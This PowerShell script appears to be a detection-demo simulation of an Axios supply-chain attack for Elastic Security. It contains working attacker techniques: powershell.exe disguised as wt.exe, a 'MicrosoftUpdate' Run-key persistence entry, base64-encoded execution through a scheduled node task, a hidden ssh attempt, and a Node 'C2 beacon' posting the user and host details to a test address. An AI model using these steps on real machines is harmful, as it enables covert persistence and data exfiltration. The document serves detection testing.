# ==============================================================================
# Simulation Script: Axios Supply Chain Artifact Generation & Detection Testing
# ==============================================================================
#
# Purpose:
#   Simulates the forensic artifacts of an Axios supply chain attack in a
#   live host environment. Run this script on the Windows demo host to
#   generate the following artifacts and behaviors:
#
#     1. Terminate any lingering node, wt, or ssh processes from prior runs.
#     2. Ensure OpenSSH client and Node.js are installed.
#     3. Generate an RSA SSH key pair and known_hosts file under ~/.ssh.
#     4. Copy powershell.exe to C:\ProgramData\wt.exe (binary masquerade).
#     5. Via a scheduled task, run node.exe which launches wt.exe, which:
#          a. Sets a registry Run key for persistence (MicrosoftUpdate).
#          b. Drops a staged payload file at C:\TEMP\stage2.ps1.
#          c. Spawns ssh.exe targeting 192.0.2.1 (lateral movement simulation).
#     6. Send an outbound HTTP POST to 192.0.2.1:8000 via Node.js (C2 beacon).
#
#   All activity is benign. The Windows host should have Elastic Agent with
#   Elastic Defend in Detect mode -- simulated activity is visible in the
#   Elastic Security console for live detection demos.
#
# Prerequisites:
#   - One demo host (Windows) attached to a live Elastic Security cluster. 
#   - Elastic Agent installed along with Elastic Defend enabled (in Detect mode) and osquery integration
#     enabled.
#   - Node.js must be installed on the Windows host (script will attempt to
#     install it via winget if not found).
#   - A local user account "js_eng_admin" on the Windows host. Log in as
#     this user before running the script so all artifacts are correctly attributed.
#
# ==============================================================================


function Write-Status {
    param (
        [string]$Action,
        [string]$Status,
        [string]$Detail
    )
    $color = if ($Status -eq "SUCCESS") { "Green" } elseif ($Status -eq "FAILED") { "Red" } else { "Yellow" }
    Write-Host "[$Status] $Action - $Detail" -ForegroundColor $color
}

# ------------------------------------------------------------------------------
# 1. PROCESS CLEANUP ON WINDOWS HOST
# ------------------------------------------------------------------------------
$targetProcesses  = @("node", "wt", "ssh")
$runningProcesses = Get-Process -Name $targetProcesses -ErrorAction SilentlyContinue

if ($runningProcesses) {
    Stop-Process -Name $targetProcesses -Force -ErrorAction SilentlyContinue
    Write-Status -Action "Process Termination" -Status "SUCCESS" -Detail "Terminated active processes: $($runningProcesses.Name -join ', ')"
} else {
    Write-Status -Action "Process Termination" -Status "SKIPPED" -Detail "No active target processes (node, wt, ssh) found"
}

# ------------------------------------------------------------------------------
# 2. DEPENDENCY SETUP ON WINDOWS HOST
# ------------------------------------------------------------------------------
$sshCapability = Get-WindowsCapability -Online | Where-Object Name -Like "OpenSSH.Client*"
if ($sshCapability.State -ne "Installed") {
    try {
        Add-WindowsCapability -Online -Name "OpenSSH.Client~~~~0.0.1.0" -ErrorAction Stop | Out-Null
        Write-Status -Action "OpenSSH Installation" -Status "SUCCESS" -Detail "Installed OpenSSH.Client"
    } catch {
        Write-Status -Action "OpenSSH Installation" -Status "FAILED" -Detail $_.Exception.Message
    }
} else {
    Write-Status -Action "OpenSSH Installation" -Status "SUCCESS" -Detail "OpenSSH.Client already installed"
}

if (-not (Get-Command node -ErrorAction SilentlyContinue)) {
    try {
        winget install --id OpenJS.NodeJS -e --source winget --accept-source-agreements --accept-package-agreements | Out-Null
        $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
        Write-Status -Action "Node.js Installation" -Status "SUCCESS" -Detail "Installed Node.js"
    } catch {
        Write-Status -Action "Node.js Installation" -Status "FAILED" -Detail $_.Exception.Message
    }
} else {
    $nodeVersion = node -v
    Write-Status -Action "Node.js Installation" -Status "SUCCESS" -Detail "Node.js present ($nodeVersion)"
}

# ------------------------------------------------------------------------------
# 3. SSH DIRECTORY SETUP
# ------------------------------------------------------------------------------
$sshDir     = Join-Path $env:USERPROFILE ".ssh"
$privKey    = Join-Path $sshDir "id_rsa"
$pubKey     = Join-Path $sshDir "id_rsa.pub"
$knownHosts = Join-Path $sshDir "known_hosts"

if (-not (Test-Path $sshDir)) {
    New-Item -ItemType Directory -Path $sshDir -Force | Out-Null
    Write-Status -Action "SSH Directory Prep" -Status "SUCCESS" -Detail "Created directory: $sshDir"
} else {
    Write-Status -Action "SSH Directory Prep" -Status "SUCCESS" -Detail "Directory exists: $sshDir"
}

$sshKeygenPath = @(
    "$env:SystemRoot\System32\OpenSSH\ssh-keygen.exe",
    "$env:ProgramFiles\OpenSSH\ssh-keygen.exe",
    "$env:ProgramFiles\Git\usr\bin\ssh-keygen.exe"
) | Where-Object { Test-Path $_ } | Select-Object -First 1

if (-not $sshKeygenPath) {
    $found = Get-Command ssh-keygen -ErrorAction SilentlyContinue
    if ($found) { $sshKeygenPath = $found.Source }
}

if (-not (Test-Path $privKey) -or -not (Test-Path $pubKey)) {
    if ($sshKeygenPath) {
        try {
            & $sshKeygenPath -t rsa -b 2048 -f $privKey -N '""' -q
            Write-Status -Action "SSH Key Generation" -Status "SUCCESS" -Detail "Generated RSA key pair via ssh-keygen in $sshDir"
        } catch {
            Write-Status -Action "SSH Key Generation" -Status "FAILED" -Detail $_.Exception.Message
        }
    } else {
        try {
            $keygenScript = Join-Path $env:TEMP "keygen.js"
            $keygenCode = @"
const { generateKeyPairSync } = require('crypto');
const fs = require('fs');
const { privateKey, publicKey } = generateKeyPairSync('rsa', {
    modulusLength: 2048,
    privateKeyEncoding: { type: 'pkcs1', format: 'pem' },
    publicKeyEncoding: { type: 'spki', format: 'pem' }
});
fs.writeFileSync(process.argv[2], privateKey);
fs.writeFileSync(process.argv[3], publicKey);
"@
            Set-Content -Path $keygenScript -Value $keygenCode -Force
            node $keygenScript $privKey $pubKey
            Write-Status -Action "SSH Key Generation" -Status "SUCCESS" -Detail "Generated RSA key pair via Node.js in $sshDir"
        } catch {
            Write-Status -Action "SSH Key Generation" -Status "FAILED" -Detail $_.Exception.Message
        }
    }
} else {
    Write-Status -Action "SSH Key Generation" -Status "SUCCESS" -Detail "RSA key pair present in $sshDir"
}

$sshExePath = @(
    "$env:SystemRoot\System32\OpenSSH\ssh.exe",
    "$env:ProgramFiles\OpenSSH\ssh.exe",
    "$env:ProgramFiles\Git\usr\bin\ssh.exe"
) | Where-Object { Test-Path $_ } | Select-Object -First 1

if (-not $sshExePath) {
    $found = Get-Command ssh -ErrorAction SilentlyContinue
    if ($found) { $sshExePath = $found.Source }
}

if (-not $sshExePath) {
    $sshExePath = Get-ChildItem "$env:SystemRoot\WinSxS" -Filter "ssh.exe" -Recurse -ErrorAction SilentlyContinue |
                  Sort-Object LastWriteTime -Descending | Select-Object -First 1 -ExpandProperty FullName
}

if ($sshExePath) {
    Write-Status -Action "SSH Client Resolution" -Status "SUCCESS" -Detail "Found ssh.exe: $sshExePath"
} else {
    Write-Status -Action "SSH Client Resolution" -Status "SKIPPED" -Detail "ssh.exe not found - SSH attempt will be skipped"
}

if (-not (Test-Path $knownHosts)) {
    try {
        New-Item -ItemType File -Path $knownHosts -Force | Out-Null
        Write-Status -Action "SSH known_hosts Prep" -Status "SUCCESS" -Detail "Created file: $knownHosts"
    } catch {
        Write-Status -Action "SSH known_hosts Prep" -Status "FAILED" -Detail $_.Exception.Message
    }
} else {
    Write-Status -Action "SSH known_hosts Prep" -Status "SUCCESS" -Detail "File exists: $knownHosts"
}

# ------------------------------------------------------------------------------
# 4. PRE-RUN WINDOWS HOST
# ------------------------------------------------------------------------------
$regPath      = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regValueName = "MicrosoftUpdate"
$maskedExe    = Join-Path $env:ProgramData "wt.exe"

Remove-ItemProperty -Path $regPath -Name $regValueName -ErrorAction SilentlyContinue
if (Test-Path $maskedExe) {
    Remove-Item -Path $maskedExe -Force -ErrorAction SilentlyContinue
}
Write-Status -Action "Artifact Cleanup" -Status "SUCCESS" -Detail "Removed registry key '$regValueName' and $maskedExe"

# ------------------------------------------------------------------------------
# 5. SCHEDULED TASK EXECUTION ON WINDOWS HOST
# ------------------------------------------------------------------------------
Copy-Item -Path "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe" -Destination $maskedExe -Force

$script = {
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MicrosoftUpdate" -Value "C:\ProgramData\wt.exe" -Force

    if (-not (Test-Path "C:\TEMP")) {
        New-Item -ItemType Directory -Path "C:\TEMP" | Out-Null
    }
    Set-Content -Path "C:\TEMP\stage2.ps1" -Value "# Stage 2 Payload" -Force

    $sshExe = '##SSHEXE##'
    if ($sshExe -and (Test-Path $sshExe)) {
        $sshProc = Start-Process -FilePath $sshExe -ArgumentList @(
            "-o", "StrictHostKeyChecking=no",
            "-o", "ConnectTimeout=3",
            "-o", "BatchMode=yes",
            "js_eng_admin@192.0.2.1"
        ) -WindowStyle Hidden -PassThru
        Start-Sleep -Seconds 4
        if ($null -ne $sshProc -and -not $sshProc.HasExited) { $sshProc.Kill() }
    }
}

$scriptText = $script.ToString().Replace('##SSHEXE##', $(if ($sshExePath) { $sshExePath } else { '' }))
$bytes = [System.Text.Encoding]::Unicode.GetBytes($scriptText)
$encodedCommand = [Convert]::ToBase64String($bytes)

$cmdLine = "C:\\ProgramData\\wt.exe -ExecutionPolicy Bypass -NoProfile -EncodedCommand $encodedCommand"

# Changed from exec to execSync to force Node to wait for wt.exe
$nodeScript = "require('child_process').execSync('$cmdLine')"

$nodePayloadPath = Join-Path $env:TEMP "malicious_app.js"
Set-Content -Path $nodePayloadPath -Value $nodeScript -Force

$action = New-ScheduledTaskAction -Execute "node.exe" -Argument "`"$nodePayloadPath`""
Register-ScheduledTask -TaskName "NodeDemoService" -Action $action -User $env:USERNAME -Force | Out-Null
Start-ScheduledTask -TaskName "NodeDemoService"

# Keeps the overall execution orderly before Section 7
Start-Sleep -Seconds 12

Unregister-ScheduledTask -TaskName "NodeDemoService" -Confirm:$false | Out-Null
Write-Status -Action "Service Simulation" -Status "SUCCESS" -Detail "Spawned Node.js as a background service via Scheduled Task"

# ------------------------------------------------------------------------------
# 7. OUTBOUND SIGNAL FROM WINDOWS HOST
# ------------------------------------------------------------------------------
$currentUser = $env:USERNAME
$currentHost = $env:COMPUTERNAME
$osVersion   = (Get-CimInstance Win32_OperatingSystem).Caption

$c2Script = Join-Path $env:TEMP "c2_signal.js"
$c2Code = @"
const http = require('http');

const payload = JSON.stringify({
    session_id: 'a1b2c3d4e5f67890',
    username: '$currentUser',
    hostname: '$currentHost',
    os_version: '$osVersion'
});

const base64Payload = Buffer.from(payload).toString('base64');

const req = http.request({
    host: '192.0.2.1',
    port: 8000,
    method: 'POST',
    headers: {
        'Content-Type': 'text/plain',
        'Content-Length': Buffer.byteLength(base64Payload)
    }
});

req.on('error', e => {
    if (e.code !== 'ECONNRESET' && e.code !== 'ETIMEDOUT') {
        console.error("ERROR: " + e.message);
    }
});

req.write(base64Payload);
req.end();
"@
Set-Content -Path $c2Script -Value $c2Code -Force

try {
    node $c2Script
    Write-Status -Action "C2 Beacon" -Status "SUCCESS" -Detail "Executed C2 signal script targeting 192.0.2.1:8000"
} catch {
    Write-Status -Action "C2 Beacon" -Status "FAILED" -Detail $_.Exception.Message
}

# ------------------------------------------------------------------------------
# 8. FINALIZATION
# ------------------------------------------------------------------------------
Write-Host "Press any key to continue..." -NoNewline
[void][System.Console]::ReadKey($true)